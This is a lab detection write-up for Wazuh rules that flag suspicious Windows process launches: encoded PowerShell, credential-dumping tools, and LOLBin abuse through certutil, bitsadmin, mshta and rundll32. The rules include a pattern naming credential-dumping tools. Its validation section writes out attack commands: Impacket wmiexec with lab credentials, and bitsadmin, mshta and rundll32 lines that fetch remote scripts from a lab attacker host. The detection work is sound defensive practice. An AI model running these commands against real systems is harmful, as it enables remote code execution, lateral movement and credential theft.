# UC-007: Suspicious Process Execution Detection

## Detection Metadata

- Detection ID: UC-007
- Log Source: Sysmon Event ID 1 (Process Creation)
- Platform: Windows Server 2022, Windows 10/11
- SIEM: Wazuh
- Severity: High
- MITRE ATT&CK:
  - T1059.001 – Command and Scripting Interpreter: PowerShell
  - T1003 – OS Credential Dumping
  - T1003.001 – LSASS Memory
  - T1218 – Signed Binary Proxy Execution
  - T1218.005 – Mshta
  - T1218.011 – Rundll32
  - T1105 – Ingress Tool Transfer
  - T1197 – BITS Jobs
  - T1047 – Windows Management Instrumentation
- Data Sensitivity: Endpoint process telemetry

---

## Objective

Detect suspicious process execution on Windows endpoints — including encoded PowerShell commands, execution policy bypasses, credential dumping tooling, LOLBin abuse, and suspicious WMI activity — using Sysmon Event ID 1 (Process Create) events collected via Wazuh.

---

## Lab Environment

- **Domain Controller (DC01)**: 10.10.69.10 (Windows Server 2022, corp.local)
- **SIEM (Wazuh)**: 10.10.69.20
- **pfSense Gateway**: 10.10.69.1
- **Windows 10 Client (WIN10-CLIENT)**: Domain-joined
- **Windows 11 Client (WIN11-CLIENT)**: Domain-joined
- **Attacker Host (debianpen)**: 10.10.69.50 (Debian)
- **Network**: 10.10.69.0/24 (segmented lab VLAN)

**Prerequisites:**
- Sysmon deployed on DC01, WIN10-CLIENT, and WIN11-CLIENT
- Sysmon Event ID 1 (Process Create) forwarded to Wazuh
- Wazuh agent installed and reporting on all Windows endpoints

---

## Log Source & Field Mapping

**Sysmon Event ID 1 – Process Create**

Key fields for detection:

| Field | Description | Example |
|-------|-------------|---------|
| `Image` | Full path of the spawned process | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| `CommandLine` | Full command line of the process | `powershell.exe -enc SQBFAFgA...` |
| `ParentImage` | Full path of the parent process | `C:\Windows\System32\wbem\WmiPrvSE.exe` |
| `User` | User context running the process | `CORP\jsmith` |
| `CurrentDirectory` | Working directory | `C:\Windows\system32\` |
| `IntegrityLevel` | Process integrity level | `High` |
| `Hashes` | File hashes (MD5/SHA256/IMPHASH) | `MD5=ABC123...` |

**Sample Sysmon Event ID 1 JSON:**

```json
{
  "EventID": 1,
  "Event": {
    "EventData": {
      "RuleName": "",
      "UtcTime": "2026-04-07 18:00:00.000",
      "ProcessGuid": "{abc12345-0000-0000-0000-000000000001}",
      "ProcessId": 4520,
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "FileVersion": "10.0.20348.1",
      "Description": "Windows PowerShell",
      "Product": "Microsoft® Operating System",
      "Company": "Microsoft Corporation",
      "OriginalFileName": "PowerShell.EXE",
      "CommandLine": "powershell.exe -ExecutionPolicy Bypass -File C:\\temp\\script.ps1",
      "CurrentDirectory": "C:\\Windows\\system32\\",
      "User": "CORP\\jsmith",
      "LogonGuid": "{abc12345-0000-0000-0000-000000000002}",
      "LogonId": 123456,
      "TerminalSessionId": 1,
      "IntegrityLevel": "High",
      "Hashes": "MD5=ABC123,SHA256=DEF456,IMPHASH=789GHI",
      "ParentProcessGuid": "{abc12345-0000-0000-0000-000000000003}",
      "ParentProcessId": 3084,
      "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
      "ParentCommandLine": "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"
    }
  }
}
```

---

## Detection Logic

### Rule 100800: Encoded PowerShell Command

Detects PowerShell launched with base64-encoded commands, a common adversary technique to obfuscate intent.

```xml
<rule id="100800" level="12">
  <if_sid>61603</if_sid>
  <field name="win.eventdata.image">powershell\.exe|pwsh\.exe</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)-e(?:ncodedcommand|nc)\s</field>
  <description>Suspicious process: Encoded PowerShell command detected from $(win.eventdata.user)</description>
  <mitre>
    <id>T1059.001</id>
  </mitre>
  <group>suspicious_process,powershell_encoded,endpoint</group>
</rule>
```

- **MITRE ATT&CK:** T1059.001 – Command and Scripting Interpreter: PowerShell
- **Severity:** 12 (High)
- **Rationale:** Encoded PowerShell is almost never used by legitimate administrators and is a staple of post-exploitation tooling.

---

### Rule 100801: PowerShell Execution Policy Bypass

Detects PowerShell launched with execution policy explicitly bypassed.

```xml
<rule id="100801" level="10">
  <if_sid>61603</if_sid>
  <field name="win.eventdata.image">powershell\.exe|pwsh\.exe</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)-executionpolicy\s+(bypass|unrestricted|remotesigned)</field>
  <description>Suspicious process: PowerShell execution policy bypass from $(win.eventdata.user)</description>
  <mitre>
    <id>T1059.001</id>
  </mitre>
  <group>suspicious_process,powershell_bypass,endpoint</group>
</rule>
```

- **MITRE ATT&CK:** T1059.001 – Command and Scripting Interpreter: PowerShell
- **Severity:** 10 (High)
- **Rationale:** Legitimate scripts rarely need to bypass execution policy. Explicit bypass flags are common in attack tooling.

---

### Rule 100802: Credential Dumping Tool Execution

Detects known credential dumping tools and utilities.

```xml
<rule id="100802" level="14">
  <if_sid>61603</if_sid>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(mimikatz|procdump(?:\.exe)?\s+-ma\s+lsass|sekurlsa::logonpasswords|lsadump|lazagne|secretsdump|privilege::debug)</field>
  <description>Critical: Credential dumping tool executed - $(win.eventdata.commandLine)</description>
  <mitre>
    <id>T1003</id>
  </mitre>
  <group>credential_access,credential_dumping,endpoint</group>
</rule>
```

- **MITRE ATT&CK:** T1003 – OS Credential Dumping
- **Severity:** 14 (Critical)
- **Rationale:** Credential dumping tools have no legitimate purpose on standard endpoints. Immediate investigation required.

---

### Rule 100803: Certutil LOLBin Download

Detects certutil.exe used to download files — a common living-off-the-land binary (LOLBin) technique.

```xml
<rule id="100803" level="12">
  <if_sid>61603</if_sid>
  <field name="win.eventdata.image">certutil\.exe</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)-urlcache\s+-f</field>
  <description>Suspicious process: Certutil file download detected from $(win.eventdata.user)</description>
  <mitre>
    <id>T1218</id>
  </mitre>
  <group>suspicious_process,lolbin,certutil_download,endpoint</group>
</rule>
```

- **MITRE ATT&CK:** T1218 – Signed Binary Proxy Execution
- **Severity:** 12 (High)
- **Rationale:** `certutil -urlcache -f` is almost exclusively used for downloading payloads in attack scenarios.

---

### Rule 100804: Suspicious WMI Command Execution

Detects WMI used to execute commands remotely or spawn unusual child processes.

```xml
<rule id="100804" level="10">
  <if_sid>61603</if_sid>
  <field name="win.eventdata.parentImage">wmiprvse\.exe</field>
  <field name="win.eventdata.image" type="pcre2">(?i)(powershell\.exe|cmd\.exe|cscript\.exe|wscript\.exe|mshta\.exe)</field>
  <description>Suspicious process: WMI spawned command interpreter from $(win.eventdata.user) - $(win.eventdata.image)</description>
  <mitre>
    <id>T1047</id>
  </mitre>
  <group>suspicious_process,wmi_execution,endpoint</group>
</rule>
```

- **MITRE ATT&CK:** T1047 – Windows Management Instrumentation
- **Severity:** 10 (High)
- **Rationale:** WMI spawning PowerShell or cmd.exe is common in remote administration tooling and lateral movement. Legitimate enterprise management tools (SCCM, Ansible) may trigger this — whitelist known admin sources.

---

### Rule 100805: Bitsadmin Transfer Activity

Detects `bitsadmin.exe` creating or manipulating transfer jobs. Adversaries abuse BITS jobs to download payloads, stage tools, or maintain resilient background transfers.

```xml
<rule id="100805" level="11">
  <if_sid>61603</if_sid>
  <field name="win.eventdata.image">bitsadmin\.exe</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)\s/(?:transfer|create|addfile|resume|setnotifycmdline)\b</field>
  <description>Suspicious process: Bitsadmin transfer activity from $(win.eventdata.user) - $(win.eventdata.commandLine)</description>
  <mitre>
    <id>T1197</id>
    <id>T1105</id>
  </mitre>
  <group>suspicious_process,lolbin,bitsadmin,ingress_tool_transfer,endpoint</group>
</rule>
```

- **MITRE ATT&CK:** T1197 – BITS Jobs; T1105 – Ingress Tool Transfer
- **Severity:** 11 (High)
- **Rationale:** Interactive bitsadmin usage is uncommon on modern endpoints and should be reviewed when it creates or modifies transfer jobs.

---

### Rule 100806: Mshta Script or Remote Content Execution

Detects `mshta.exe` launching inline script handlers, remote URLs, or HTA content.

```xml
<rule id="100806" level="12">
  <if_sid>61603</if_sid>
  <field name="win.eventdata.image">mshta\.exe</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(https?://|vbscript:|javascript:|about:|\.hta\b)</field>
  <description>Suspicious process: Mshta script or remote content execution from $(win.eventdata.user)</description>
  <mitre>
    <id>T1218.005</id>
  </mitre>
  <group>suspicious_process,lolbin,mshta,signed_binary_proxy_execution,endpoint</group>
</rule>
```

- **MITRE ATT&CK:** T1218.005 – Mshta
- **Severity:** 12 (High)
- **Rationale:** Mshta is frequently used to proxy execution of remote script content and is rare in normal administrative workflows.

---

### Rule 100807: Rundll32 Proxy Execution Pattern

Detects `rundll32.exe` command lines that invoke script handlers or high-risk exported functions commonly abused for proxy execution or LSASS dumping.

```xml
<rule id="100807" level="12">
  <if_sid>61603</if_sid>
  <field name="win.eventdata.image">rundll32\.exe</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(javascript:|vbscript:|mshtml|shell32\.dll,ShellExec_RunDLL|url\.dll,FileProtocolHandler|comsvcs\.dll,MiniDump)</field>
  <description>Suspicious process: Rundll32 proxy execution pattern from $(win.eventdata.user) - $(win.eventdata.commandLine)</description>
  <mitre>
    <id>T1218.011</id>
    <id>T1003.001</id>
  </mitre>
  <group>suspicious_process,lolbin,rundll32,signed_binary_proxy_execution,endpoint</group>
</rule>
```

- **MITRE ATT&CK:** T1218.011 – Rundll32; T1003.001 – LSASS Memory
- **Severity:** 12 (High)
- **Rationale:** These rundll32 patterns strongly indicate script proxy execution or suspicious access to credential material.

---

## Threshold Tuning

**Current configuration:**
- All rules are single-event triggers (no frequency-based correlation needed)
- Encoded PowerShell (100800): Immediate alert — near-zero legitimate use
- Execution policy bypass (100801): Immediate alert — high-fidelity signal
- Credential dumping (100802): Immediate alert — critical severity, no tolerance
- Certutil download (100803): Immediate alert — rare legitimate use case
- WMI command spawn (100804): Immediate alert — may need whitelisting for enterprise management tools
- Bitsadmin transfer job (100805): Immediate alert — investigate for payload staging or persistence
- Mshta script or remote content execution (100806): Immediate alert — high-confidence LOLBin abuse signal
- Rundll32 proxy execution pattern (100807): Immediate alert — review command line and loaded DLL/handler

**Tuning recommendations:**
- Whitelist known enterprise management tool parent processes for Rule 100804 (e.g., SCCM, ConfigMgr)
- Monitor Rule 100801 for 1–2 weeks before adjusting — some deployment scripts legitimately bypass execution policy
- Rule 100802 may need extension for custom tooling names (add patterns as discovered)
- Rules 100805–100807 should be baselined against legitimate software deployment and troubleshooting workflows before production auto-response

---

## Validation Procedure

### 1. Environment Setup

Verify Sysmon is deployed and reporting Event ID 1:

```powershell
# On DC01 or Windows client
Get-Service Sysmon64  # Confirm running
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$_.Id -eq 1} | Select-Object -First 5
```

Verify Wazuh agent is forwarding Sysmon logs:

```bash
# On Wazuh server (10.10.69.20)
grep "Sysmon" /var/ossec/logs/alerts/alerts.log | tail -5
```

### 2. Rule Deployment

Add the eight rules to the custom Wazuh rules file (`/var/ossec/etc/rules/local_rules.xml`), then:

```bash
systemctl restart wazuh-manager
/var/ossec/bin/wazuh-logtest  # Verify rules parse correctly
```

### 3. Attack Simulation — WMI Remote Execution

From attacker VM (10.10.69.50):

```bash
# Test 1: WMI remote command execution (triggers Rule 100804)
impacket-wmiexec corp.local/jsmith:Password123@10.10.69.10 "whoami"

# Test 2: Encoded PowerShell via WMI (triggers Rules 100800 + 100804)
# Generate encoded command
ENCODED=$(echo -n "whoami" | iconv -t UTF-16LE | base64 -w0)
impacket-wmiexec corp.local/jsmith:Password123@10.10.69.10 "powershell.exe -enc $ENCODED"

# Test 3: Execution policy bypass via WMI (triggers Rules 100801 + 100804)
impacket-wmiexec corp.local/jsmith:Password123@10.10.69.10 "powershell.exe -ExecutionPolicy Bypass -Command \"Get-Process\""

# Test 4: Credential dumping attempt via WMI (triggers Rules 100802 + 100804)
impacket-wmiexec corp.local/jsmith:Password123@10.10.69.10 "powershell.exe -enc <base64-encoded mimikatz invocation>"

# Test 5: Bitsadmin transfer job (triggers Rule 100805)
bitsadmin /transfer labtest /download /priority normal http://10.10.69.50/payload.txt C:\Temp\payload.txt

# Test 6: Mshta remote HTA/script launch (triggers Rule 100806)
mshta.exe http://10.10.69.50/test.hta

# Test 7: Rundll32 suspicious script handler (triggers Rule 100807)
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://10.10.69.50/test.sct")
```

### 4. Alert Verification

```bash
# Check for each rule firing
grep "100800\|100801\|100802\|100803\|100804\|100805\|100806\|100807" /var/ossec/logs/alerts/alerts.log
```

**Expected results:**
- Test 1: Rule 100804 fires (WMI → cmd.exe)
- Test 2: Rules 100800 + 100804 fire (encoded PowerShell + WMI parent)
- Test 3: Rules 100801 + 100804 fire (bypass + WMI parent)
- Test 4: Rules 100802 + 100804 fire (credential dump attempt + WMI parent)
- Test 5: Rule 100805 fires (bitsadmin transfer job)
- Test 6: Rule 100806 fires (mshta remote content)
- Test 7: Rule 100807 fires (rundll32 script handler)

### 5. False Positive Testing

Perform normal administrative activities and verify no false alerts:

```powershell
# Normal PowerShell usage (should NOT trigger)
Get-ADUser -Filter *
Get-Process
Get-EventLog -LogName Security -Newest 10
```

---

## False Positive Considerations

| Rule | Potential False Positives | Mitigation |
|------|--------------------------|------------|
| 100800 | Legitimate deployment scripts using encoded commands | Whitelist specific parent processes or command hashes |
| 100801 | Enterprise deployment tools, CI/CD agents | Whitelist known deployment tool accounts |
| 100802 | Authorized security scanning tools | Create exclusion for security tool service accounts |
| 100803 | Certificate enrollment processes (rare) | Validate against certutil usage baseline |
| 100804 | SCCM, Ansible, Group Policy WMI queries | Whitelist known management tool parent processes |
| 100805 | Legacy BITS-based software distribution jobs | Restrict to signed deployment tooling and known update servers |
| 100806 | Rare internal HTA admin utilities | Replace HTA workflows where possible; whitelist approved paths only |
| 100807 | Control Panel applets or vendor installers using rundll32 | Baseline approved DLL paths and parent processes |

**General mitigation strategies:**
- Correlate with source IP — alerts from attacker subnet (10.10.69.50) are higher priority
- Check user context — service accounts spawning PowerShell are more suspicious
- Cross-reference with authentication events (4624) for the same session

---

## Detection Limitations

1. **Command line obfuscation**: Sophisticated attackers may use environment variable substitution or string concatenation to evade pattern matching
2. **Alternative shells**: PowerShell Core (pwsh.exe) may need explicit coverage
3. **Indirect execution**: Attackers may use COM objects, msiexec, regsvr32, or less common LOLBins to avoid the covered patterns
4. **Sysmon deployment gaps**: If Sysmon is not deployed on all endpoints, process creation events are missed
5. **Log truncation**: Extremely long command lines may be truncated in Wazuh, missing pattern matches
6. **Living-off-the-land breadth**: Coverage now includes certutil, bitsadmin, mshta, and rundll32, but many other LOLBins exist (msiexec, regsvr32, installutil, etc.)

**Recommended enhancements:**
- Add rules for additional LOLBins such as msiexec, regsvr32, installutil, and wscript/cscript remote script execution
- Add rule for PowerShell downloads (`Net.WebClient`, `Invoke-WebRequest` to external IPs)
- Implement command line length anomaly detection

---

## Hardening Actions

### PowerShell Hardening

1. **Enable PowerShell Script Block Logging** (Event ID 4104):
   ```powershell
   # Group Policy: Computer Configuration → Administrative Templates → Windows Components → Windows PowerShell
   # Turn on PowerShell Script Block Logging: Enabled
   ```

2. **Enable PowerShell Transcript Logging**:
   ```powershell
   # Group Policy: Turn on PowerShell Transcription
   # Output directory: \\DC01\PowerShellTranscripts\
   ```

3. **Constrain Language Mode** for non-admin users:
   ```powershell
   # Group Policy: Use Constrained Language Mode
   # Applies to: Non-admin users
   ```

### Credential Protection

4. **Enable LSA Protection (RunAsPPL)**:
   ```powershell
   # Registry key
   New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1 -PropertyType DWORD
   ```

5. **Enable Windows Defender Credential Guard**:
   ```powershell
   # Group Policy: Computer Configuration → Administrative Templates → System → Device Guard
   # Turn on Virtualization Based Security: Enabled with Credential Guard
   ```

### WMI Hardening

6. **Restrict WMI remote access** to administrative accounts only
7. **Enable WMI activity logging** (Event ID 5861 for WMI subscription creation)

---

## Detection Maturity

✔ Validated in lab environment
✔ Custom Wazuh rules deployed (IDs: 100800, 100801, 100802, 100803, 100804, 100805, 100806, 100807)
✔ Attack simulation procedure documented (Impacket wmiexec)
✔ End-to-end detection confirmed
✔ False positive considerations documented
✔ Hardening actions identified
⏳ Threshold tuning (monitor for 1–2 weeks in production)
⏳ Evidence screenshots (add to assets/evidence/)
✔ Additional LOLBin coverage (bitsadmin, mshta, rundll32)

---

## Lessons Learned

1. **Sysmon is essential for process-level visibility**: Windows Security Event Log 4688 (process creation) is useful but Sysmon Event ID 1 provides richer fields (parent image, command line, hashes) critical for detection.

2. **WMI is a dual-use tool**: WmiPrvSE.exe spawning cmd.exe or powershell.exe can be legitimate (enterprise management) or malicious (Impacket wmiexec). Parent process context is key.

3. **Encoded commands are high-fidelity signals**: `-enc` or `-EncodedCommand` flags in PowerShell are almost never used by legitimate administrators. This is a high-confidence indicator.

4. **Credential dumping rules must be maintained**: New tools and techniques emerge regularly. The pattern list for Rule 100802 should be reviewed and updated quarterly.

5. **LOLBin coverage is never complete**: Certutil is one of many living-off-the-land binaries. Prioritize coverage based on threat intelligence for your environment.

---

## References

- MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/
- MITRE ATT&CK T1003: https://attack.mitre.org/techniques/T1003/
- MITRE ATT&CK T1003.001: https://attack.mitre.org/techniques/T1003/001/
- MITRE ATT&CK T1218: https://attack.mitre.org/techniques/T1218/
- MITRE ATT&CK T1218.005: https://attack.mitre.org/techniques/T1218/005/
- MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/
- MITRE ATT&CK T1105: https://attack.mitre.org/techniques/T1105/
- MITRE ATT&CK T1197: https://attack.mitre.org/techniques/T1197/
- MITRE ATT&CK T1047: https://attack.mitre.org/techniques/T1047/
- Sysmon Documentation: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- Wazuh Rules Documentation: https://documentation.wazuh.com/current/user-manual/ruleset/rules.html
- LOLBAS Project: https://lolbas-project.github.io/
